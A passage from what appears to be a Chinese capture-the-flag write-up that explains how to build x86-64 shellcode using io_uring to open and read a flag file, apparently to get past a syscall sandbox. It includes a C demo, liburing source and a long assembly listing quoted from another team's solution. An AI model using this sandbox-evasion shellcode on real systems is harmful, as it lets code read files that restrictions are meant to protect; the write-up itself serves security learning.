<span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">char</span> buf[<span class="number">1024</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  io_uring ring;</span><br><span class="line">  <span class="built_in">io_uring_queue_init</span>(<span class="number">32</span>, &amp;ring, <span class="number">0</span>);</span><br><span class="line">  io_uring_cqe* res;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">io_uring_sqe</span>* sqe = <span class="built_in">io_uring_get_sqe</span>(&amp;ring);</span><br><span class="line">  <span class="type">int</span> dirfd = AT_FDCWD;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *pathname = <span class="string">&quot;./flag&quot;</span>;</span><br><span class="line">  <span class="type">int</span> flags = O_RDONLY;</span><br><span class="line">  <span class="built_in">io_uring_prep_openat</span>(sqe, dirfd, pathname, flags, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">io_uring_submit</span>(&amp;ring);</span><br><span class="line">  <span class="built_in">io_uring_wait_cqe</span>(&amp;ring, &amp;res);</span><br><span class="line">  <span class="type">int</span> fd = res-&gt;res;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;file descriptor: %d\n&quot;</span>, fd);</span><br><span class="line">  </span><br><span class="line">  sqe = <span class="built_in">io_uring_get_sqe</span>(&amp;ring);</span><br><span class="line">  <span class="built_in">io_uring_prep_read</span>(sqe, fd, buf, <span class="built_in">sizeof</span>(buf), <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">io_uring_submit</span>(&amp;ring);</span><br><span class="line">  <span class="built_in">io_uring_wait_cqe</span>(&amp;ring, &amp;res);</span><br><span class="line">  <span class="built_in">assert</span>(res);</span><br><span class="line">  std::cout &lt;&lt; <span class="string">&quot;read bytes: &quot;</span> &lt;&lt; res-&gt;res &lt;&lt; <span class="string">&quot; \n&quot;</span>;</span><br><span class="line">  std::cout &lt;&lt; buf &lt;&lt; std::endl;</span><br><span class="line">  <span class="built_in">io_uring_cqe_seen</span>(&amp;ring, res);</span><br><span class="line">  <span class="built_in">io_uring_queue_exit</span>(&amp;ring);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>注意编译时需要加上<code>-luring</code>编译选项。</p>
<p>在这个demo中，我们看到一些上面没见过的函数，比如<code>io_uring_prep_read</code>等，这些函数又是在哪里声明与实现的呢？我翻遍了整个liburing仓库，但只看到了这些函数的声明，直到最后我在Linux的源码中发现了这些函数的实现。而且最坑的是，在elixir.bootlin.com中直接搜这些函数很可能还搜不到。</p>
<p>这些函数的实现位于<code>/tools/io_uring/liburing.h</code>（Linux 6.5.7版本，在Linux 6.6里面反而找不到这个目录了）中，但不是全都有，如<code>io_uring_prep_read</code>、<code>io_uring_prep_write</code>、<code>io_uring_prep_openat</code>等实际上调用的都是<code>io_uring_prep_rw</code>。在对demo程序进行逆向后发现，<code>io_uring_prep_read</code>实际上除了不需要我们使用读操作的opcode之外，其他的参数赋值都是一样的。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">io_uring_prep_rw</span><span class="params">(<span class="type">int</span> op, <span class="keyword">struct</span> io_uring_sqe *sqe, <span class="type">int</span> fd,</span></span><br><span class="line"><span class="params">				    <span class="type">const</span> <span class="type">void</span> *addr, <span class="type">unsigned</span> len,</span></span><br><span class="line"><span class="params">				    <span class="type">off_t</span> offset)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="built_in">memset</span>(sqe, <span class="number">0</span>, <span class="keyword">sizeof</span>(*sqe));</span><br><span class="line">	sqe-&gt;opcode = op;</span><br><span class="line">	sqe-&gt;fd = fd;</span><br><span class="line">	sqe-&gt;off = offset;</span><br><span class="line">	sqe-&gt;addr = (<span class="type">unsigned</span> <span class="type">long</span>) addr;</span><br><span class="line">	sqe-&gt;len = len;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在上面的C文件中，我们可以看到，有一些封装好的函数可以帮助我们与共享内存空间进行交互。那么在我们写shellcode的时候，就可以通过使用静态编译的C程序将这些函数提取出来，放在我们的shellcode后面，这样就能够在shellcode中直接使用这些封装函数，而不需要我们直接对内存空间进行操作，这样不仅省时，还能减少错误。</p>
<p>下面，我们就来尝试将上面的C程序变成shellcode。</p>
<p>我们将上面的程序进行静态编译，可以提取出下面几个较简单的封装函数的汇编代码，由于代码篇幅较大，这里省略展示：</p>
<ul>
<li><code>io_uring_get_sqe</code></li>
<li><code>io_uring_prep_openat</code></li>
<li><code>io_uring_prep_rw</code>（被<code>io_uring_prep_openat</code>调用）</li>
<li><code>io_uring_submit</code></li>
<li><code>_io_uring_flush_sq</code>（被<code>io_uring_submit</code>调用）</li>
<li><code>_io_uring_submit</code>（被<code>io_uring_submit</code>调用）</li>
</ul>
<p>除此之外，还有一些比较复杂的函数，如<code>io_uring_wait_cqe</code>等，将其转换为汇编语言的代码长度可能较长。</p>
<p>值得注意的是，由于<code>io_uring</code>在本质上是异步的IO系统，因此如果<code>io_uring</code>在向控制台输出内容后不久程序就会结束，有很大的可能会出现看不到输出的情况。这是正常现象，多试几次就能够出现回显内容。</p>
<p>不过从总体上来看，这段代码的汇编长度还是太长。下面，我们来参考一下su-team师傅的<a target="_blank" rel="noopener" href="https://su-team.cn/passages/2023-10-28-ACTF/">wp</a>，分析一下这篇wp中这段汇编代码的流程：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br></pre></td><td class="code"><pre><span class="line">lea    rax,[rip+0x3f9-7]</span><br><span class="line">xor    edx,edx</span><br><span class="line">push   0x1</span><br><span class="line">pop    rdi</span><br><span class="line">movq   xmm2,rax</span><br><span class="line">sub    rsp,0x108</span><br><span class="line">lea    rbx,[rsp+0x20]</span><br><span class="line">lea    rbp,[rsp+0x40]</span><br><span class="line">movq   xmm0,rbx</span><br><span class="line">push   rbp</span><br><span class="line">pop    rsi</span><br><span class="line">lea    r12,[rsp+0x18]</span><br><span class="line">punpcklqdq xmm0,xmm2</span><br><span class="line">movaps XMMWORD PTR [rsp],xmm0</span><br><span class="line">sub    rsp,0x88</span><br><span class="line">push   rdx</span><br><span class="line">pop    r9</span><br><span class="line">push   rdi</span><br><span class="line">pop    r8</span><br><span class="line">push   0xf</span><br><span class="line">pop    rcx</span><br><span class="line">xor    eax,eax</span><br><span class="line">push   rsp</span><br><span class="line">pop    rdx</span><br><span class="line">push   rdx</span><br><span class="line">pop    rdi</span><br><span class="line">rep stos QWORD PTR es:[rdi],rax</span><br><span class="line">push   r8</span><br><span class="line">pop    rdi</span><br><span class="line">push   r12</span><br><span class="line">push   rbp</span><br><span class="line">push   rdx</span><br><span class="line">pop    rbp</span><br><span class="line">push   rbx</span><br><span class="line">mov    rbx,rsi</span><br><span class="line">mov    rsi,rdx</span><br><span class="line">sub    rsp,0x10</span><br><span class="line">mov    esi,edi</span><br><span class="line">push   0x1a9</span><br><span class="line">pop    rdi</span><br><span class="line">call   syscall_func</span><br><span class="line">pop    r15</span><br><span class="line">lea    rdi,[rbx+0x8]</span><br><span class="line">mov    r12d,eax</span><br><span class="line">and    rdi,0xfffffffffffffff8</span><br><span class="line">mov    QWORD PTR [rbx],0x0</span><br><span class="line">mov    rdx,rbx</span><br><span class="line">mov    QWORD PTR [rbx+0xd0],0x0</span><br><span class="line">mov    ecx, 26</span><br><span class="line">rep stos QWORD PTR es:[rdi],rax</span><br><span class="line">lea    rcx,[rbx+0x68]</span><br><span class="line">mov    edi,r12d</span><br><span class="line">mov    r13d,edi</span><br><span class="line">push   r12</span><br><span class="line">mov    r12,rcx</span><br><span class="line">push   rbp</span><br><span class="line">mov    rbp,rdx</span><br><span class="line">push   rbx</span><br><span class="line">mov    rbx,rsi</span><br><span class="line">push   r15</span><br><span class="line">mov    edx,DWORD PTR [rsi]</span><br><span class="line">mov    eax,DWORD PTR [rsi+0x40]</span><br><span class="line">mov    esi,DWORD PTR [rsi+0x4]</span><br><span class="line">lea    rax,[rax+rdx*4]</span><br><span class="line">mov    edx,DWORD PTR [rbx+0x64]</span><br><span class="line">shl    rsi,0x4</span><br><span class="line">mov    QWORD PTR [rbp+0x48],rax</span><br><span class="line">add    rsi,rdx</span><br><span class="line">mov    QWORD PTR [rcx+0x38],rsi</span><br><span class="line">mov    rsi,QWORD PTR [rbp+0x48]</span><br><span class="line">mov    QWORD PTR [r12+0x38],rsi</span><br><span class="line">mov    r8d,r13d</span><br><span class="line">push   0x8001</span><br><span class="line">pop    rcx</span><br><span class="line">push   0x3</span><br><span class="line">pop    rdx</span><br><span class="line">xor    edi,edi</span><br><span class="line">call   mmap64_func</span><br><span class="line">mov    QWORD PTR [rbp+0x50],rax</span><br><span class="line">mov    QWORD PTR [r12+0x40],rax</span><br><span class="line">mov    edx,DWORD PTR [rbx+0x28]</span><br><span class="line">mov    esi,DWORD PTR [rbx]</span><br><span class="line">mov    r9d,0x10000000</span><br><span class="line">mov    r8d,r13d</span><br><span class="line">push   0x8001</span><br><span class="line">pop    rcx</span><br><span class="line">shl    rsi,0x6</span><br><span class="line">push   0</span><br><span class="line">pop    r15</span><br><span class="line">loop1:</span><br><span class="line">    add    rdx,rax</span><br><span class="line">    mov    QWORD PTR [rbp+r15*8],rdx</span><br><span class="line">    mov    edx,DWORD PTR [rbx+0x2c+r15*4]</span><br><span class="line">    inc    r15</span><br><span class="line">    cmp    r15, 6</span><br><span class="line">    jnz loop1</span><br><span class="line">add    rax,rdx</span><br><span class="line">push   0x3</span><br><span class="line">pop    rdx</span><br><span class="line">mov    QWORD PTR [rbp+0x30],rax</span><br><span class="line">call   mmap64_func</span><br><span class="line">mov    QWORD PTR [rbp+0x38],rax</span><br><span class="line">mov    edx,DWORD PTR [rbx+0x50]</span><br><span class="line">mov    rax,QWORD PTR [r12+0x40]</span><br><span class="line">push   0</span><br><span class="line">pop    r13</span><br><span class="line">push   0</span><br><span class="line">pop    r15</span><br><span class="line">loop2:</span><br><span class="line">    add    rdx,rax</span><br><span class="line">    mov    QWORD PTR [r12+r15*8],rdx</span><br><span class="line">    mov    edx,DWORD PTR [rbx+0x54+r15*4]</span><br><span class="line">    inc    r15</span><br><span class="line">    cmp    r15, 4</span><br><span class="line">    jnz loop2</span><br><span class="line">add    rdx,rax</span><br><span class="line">mov    QWORD PTR [r12+0x28],rdx</span><br><span class="line">mov    edx,DWORD PTR [rbx+0x64]</span><br><span class="line">add    rdx,rax</span><br><span class="line">mov    QWORD PTR [r12+0x30],rdx</span><br><span class="line">mov    edx,DWORD PTR [rbx+0x68]</span><br><span class="line">add    rax,rdx</span><br><span class="line">mov    QWORD PTR [r12+0x20],rax</span><br><span class="line">pop    r15</span><br><span class="line">pop    rbx</span><br><span class="line">pop    rbp</span><br><span class="line">pop    r12</span><br><span class="line">mov    r13d,eax</span><br><span class="line">mov    eax,DWORD PTR [rbp+0x8]</span><br><span class="line">mov    DWORD PTR [rbx+0xc4],r12d</span><br><span class="line">mov    DWORD PTR [rbx+0xc0],eax</span><br><span class="line">mov    eax,DWORD PTR [rbp+0x14]</span><br><span class="line">mov    DWORD PTR [rbx+0xc8],eax</span><br><span class="line">pop    r15</span><br><span class="line">pop    rbx</span><br><span class="line">pop    rbp</span><br><span class="line">pop    r12</span><br><span class="line">add    rsp,0x88</span><br><span class="line">push   rbp</span><br><span class="line">pop    rdi</span><br><span class="line">call   io_uring_get_sqe_func</span><br><span class="line">pxor   xmm1,xmm1</span><br><span class="line">movdqa xmm0,XMMWORD PTR [rsp]</span><br><span class="line">movabs rcx,0xffffffff0000001c</span><br><span class="line">movaps XMMWORD PTR [rsp+0x20],xmm1</span><br><span class="line">mov    QWORD PTR [rsp+0x30],0x0</span><br><span class="line">mov    QWORD PTR [rax],rcx</span><br><span class="line">mov    QWORD PTR [rax+0x18],0x18</span><br><span class="line">mov    QWORD PTR [rax+0x20],0x0</span><br><span class="line">mov    QWORD PTR [rax+0x28],0x0</span><br><span class="line">movups XMMWORD PTR [rax+0x8],xmm0</span><br><span class="line">pxor   xmm0,xmm0</span><br><span class="line">movups XMMWORD PTR [rax+0x30],xmm0</span><br><span class="line">call   io_uring_submit_func</span><br><span class="line">xor    edx,edx</span><br><span class="line">mov    ecx,0x1</span><br><span class="line">mov    rsi,r12</span><br><span class="line">mov    rdi,rbp</span><br><span class="line">call   __io_uring_get_cqe_func</span><br><span class="line">mov    rax,QWORD PTR [rsp+0x18]</span><br><span class="line">xor    r9d,r9d</span><br><span class="line">xor    edi,edi</span><br><span class="line">mov    rdx,QWORD PTR [rsp+0xa8]</span><br><span class="line">mov    ecx,0x2</span><br><span class="line">mov    esi,0x30</span><br><span class="line">mov    r8d,DWORD PTR [rax+0x8]</span><br><span class="line">mov    eax,DWORD PTR [rdx]</span><br><span class="line">add    eax,0x1</span><br><span class="line">mov    DWORD PTR [rdx],eax</span><br><span class="line">mov    edx,0x3</span><br><span class="line">call   mmap64_func</span><br><span class="line">mov    rdi,rbp</span><br><span class="line">mov    QWORD PTR [rsp+0x28],0x40</span><br><span class="line">mov    QWORD PTR [rsp+0x20],rax</span><br><span class="line">call   io_uring_get_sqe_func</span><br><span class="line">pxor   xmm0,xmm0</span><br><span class="line">mov    rdi,rbp</span><br><span class="line">movabs rsi,0x100000002</span><br><span class="line">mov    QWORD PTR [rax],rsi</span><br><span class="line">mov    QWORD PTR [rax+0x8],0x0</span><br><span class="line">mov    QWORD PTR [rax+0x10],rbx</span><br><span class="line">mov    QWORD PTR [rax+0x18],0x1</span><br><span class="line">mov    QWORD PTR [rax+0x20],0x0</span><br><span class="line">mov    QWORD PTR [rax+0x28],0x0</span><br><span class="line">movups XMMWORD PTR [rax+0x30],xmm0</span><br><span class="line">call   io_uring_submit_func</span><br><span class="line">xor    r8d,r8d</span><br><span class="line">xor    edx,edx</span><br><span class="line">mov    ecx,0x1</span><br><span class="line">mov    rsi,r12</span><br><span class="line">mov    rdi,rbp</span><br><span class="line">call   __io_uring_get_cqe_func</span><br><span class="line"></span><br><span class="line">io_uring_get_sqe_func:</span><br><span class="line">mov    rax,QWORD PTR [rdi]</span><br><span class="line">xor    r8d,r8d</span><br><span class="line">mov    ecx,DWORD PTR [rax]</span><br><span class="line">mov    eax,DWORD PTR [rdi+0x44]</span><br><span class="line">lea    edx,[rax+0x1]</span><br><span class="line">mov    esi,edx</span><br><span class="line">sub    esi,ecx</span><br><span class="line">mov    rcx,QWORD PTR [rdi+0x18]</span><br><span class="line">mov    rcx,QWORD PTR [rdi+0x10]</span><br><span class="line">and    eax,DWORD PTR [rcx]</span><br><span class="line">mov    DWORD PTR [rdi+0x44],edx</span><br><span class="line">shl    rax,0x6</span><br><span class="line">add    rax,QWORD PTR [rdi+0x38]</span><br><span class="line">mov    r8,rax</span><br><span class="line">mov    rax,r8</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">io_uring_submit_func:</span><br><span class="line">push   r15</span><br><span class="line">mov    r10,QWORD PTR [rdi+0x8]</span><br><span class="line">mov    edx,DWORD PTR [rdi+0x40]</span><br><span class="line">mov    r8d,DWORD PTR [rdi+0x44]</span><br><span class="line">mov    eax,DWORD PTR [r10]</span><br><span class="line">sub    r8d,edx</span><br><span class="line">mov    rcx,QWORD PTR [rdi+0x10]</span><br><span class="line">mov    r9,QWORD PTR [rdi+0x30]</span><br><span class="line">add    r8d,eax</span><br><span class="line">mov    ecx,DWORD PTR [rcx]</span><br><span class="line">nop    DWORD PTR [rax+0x0]</span><br><span class="line">mov    esi,eax</span><br><span class="line">and    edx,ecx</span><br><span class="line">add    eax,0x1</span><br><span class="line">and    esi,ecx</span><br><span class="line">mov    DWORD PTR [r9+rsi*4],edx</span><br><span class="line">mov    edx,DWORD PTR [rdi+0x40]</span><br><span class="line">add    edx,0x1</span><br><span class="line">mov    DWORD PTR [rdi+0x40],edx</span><br><span class="line">mov    DWORD PTR [r10],eax</span><br><span class="line">mov    rdx,QWORD PTR [rdi]</span><br><span class="line">sub    eax,DWORD PTR [rdx]</span><br><span class="line">xor    edx,edx</span><br><span class="line">mov    esi,eax</span><br><span class="line">mov    eax,DWORD PTR [rdi+0xc0]</span><br><span class="line">mov    ecx,eax</span><br><span class="line">and    ecx,0x2</span><br><span class="line">mov    r8d,ecx</span><br><span class="line">or     r8d,0x1</span><br><span class="line">test   al,0x1</span><br><span class="line">cmovne ecx,r8d</span><br><span class="line">mov    edi,DWORD PTR [rdi+0xc4]</span><br><span class="line">mov    r9,r8</span><br><span class="line">mov    r8d,ecx</span><br><span class="line">mov    ecx,edx</span><br><span class="line">mov    edx,esi</span><br><span class="line">mov    esi,edi</span><br><span class="line">mov    edi,0x1aa</span><br><span class="line">push   r15</span><br><span class="line">push   0x8</span><br><span class="line">call   syscall_func</span><br><span class="line">pop    rdx</span><br><span class="line">pop    rcx</span><br><span class="line">pop    r15</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">syscall_func:</span><br><span class="line">mov    rax,rdi</span><br><span class="line">mov    rdi,rsi</span><br><span class="line">mov    rsi,rdx</span><br><span class="line">mov    rdx,rcx</span><br><span class="line">mov    r10,r8</span><br><span class="line">mov    r8,r9</span><br><span class="line">mov    r9,QWORD PTR [rsp+0x8]</span><br><span class="line">syscall</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">__io_uring_get_cqe_func:</span><br><span class="line">sub    rsp,0x28</span><br><span class="line">mov    DWORD PTR [rsp],edx</span><br><span class="line">mov    rdx,rsp</span><br><span class="line">movabs rax,0x800000000</span><br><span class="line">mov    DWORD PTR [rsp+0x4],ecx</span><br><span class="line">mov    QWORD PTR [rsp+0x8],rax</span><br><span class="line">mov    QWORD PTR [rsp+0x10],r8</span><br><span class="line">push   r13</span><br><span class="line">mov    r13,rsi</span><br><span class="line">push   r12</span><br><span class="line">mov    r12,rdx</span><br><span class="line">push   rbp</span><br><span class="line">mov    rbp,rdi</span><br><span class="line">push   rbx</span><br><span class="line">push   r15</span><br><span class="line">nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">mov    rax,QWORD PTR [rbp+0x78]</span><br><span class="line">mov    esi,DWORD PTR [rax]</span><br><span class="line">mov    rax,QWORD PTR [rbp+0x70]</span><br><span class="line">mov    edx,DWORD PTR [rax]</span><br><span class="line">mov    rcx,QWORD PTR [rbp+0x68]</span><br><span class="line">mov    eax,DWORD PTR [rcx]</span><br><span class="line">sub    edx,eax</span><br><span class="line">mov    ebx,esi</span><br><span class="line">and    ebx,eax</span><br><span class="line">shl    rbx,0x4</span><br><span class="line">add    rbx,QWORD PTR [rbp+0x98]</span><br><span class="line">mov    esi,DWORD PTR [r12]</span><br><span class="line">xor    r8d,r8d</span><br><span class="line">mov    QWORD PTR [r13+0x0],rbx</span><br><span class="line">add    rsp,0x8</span><br><span class="line">mov    eax,r8d</span><br><span class="line">pop    rbx</span><br><span class="line">pop    rbp</span><br><span class="line">pop    r12</span><br><span class="line">pop    r13</span><br><span class="line">add    rsp,0x28</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">mmap64_func:</span><br><span class="line">mov    r10d,ecx</span><br><span class="line">push   0x9</span><br><span class="line">pop    rax</span><br><span class="line">syscall</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
<p>首先是对其中一些库函数的实现。这部分内容大多是对库函数的直接复制或小幅度修改。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> io_uring_sqe *<span class="title function_">io_uring_get_sqe</span><span class="params">(<span class="keyword">struct</span> io_uring *ring)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sq</span> *<span class="title">sq</span> =</span> &amp;ring-&gt;sq;</span><br><span class="line">	<span class="type">unsigned</span> next = sq-&gt;sqe_tail + <span class="number">1</span>;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sqe</span> *<span class="title">sqe</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * All sqes are used</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (next - sq-&gt;sqe_head &gt; *sq-&gt;kring_entries)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	sqe = &amp;sq-&gt;sqes[sq-&gt;sqe_tail &amp; *sq-&gt;kring_mask];</span><br><span class="line">	sq-&gt;sqe_tail = next;</span><br><span class="line">	<span class="keyword">return</span> sqe;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在wp中，将跳转标号和比较指令删除了。从源码可以看出，判断的功能是判断队列有没有满，在本题中我们实际上是不需要这个判断的，因此我们实际上还能够对wp中的汇编代码进行进一步的精简：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">io_uring_get_sqe_func:</span><br><span class="line">mov rax, [rdi]      ; rax = ring-&gt;sq</span><br><span class="line">mov ecx, [rax]      ; ecx = sq-&gt;sqe_head</span><br><span class="line">mov eax, [rdi+0x44] ; eax = sq-&gt;sqe_tail</span><br><span class="line">lea edx, [rax+1]    ; edx = rax + 1 == next</span><br><span class="line">mov rcx, [rdi+0x10] ; rcx = sq-&gt;kring_mask</span><br><span class="line">and eax, [rcx]      ; eax = sq-&gt;sqe_tail &amp; *sq-&gt;kring_mask</span><br><span class="line">mov [rdi+0x44], edx ; sq-&gt;sqe_tail = next</span><br><span class="line">shl rax, 6          ; rax = sizeof(io_uring_sqe) * (sq-&gt;sqe_tail &amp; *sq-&gt;kring_mask)</span><br><span class="line">add rax, [rdi+0x38] ; rax = &amp;sq-&gt;sqes[sq-&gt;sqe_tail &amp; 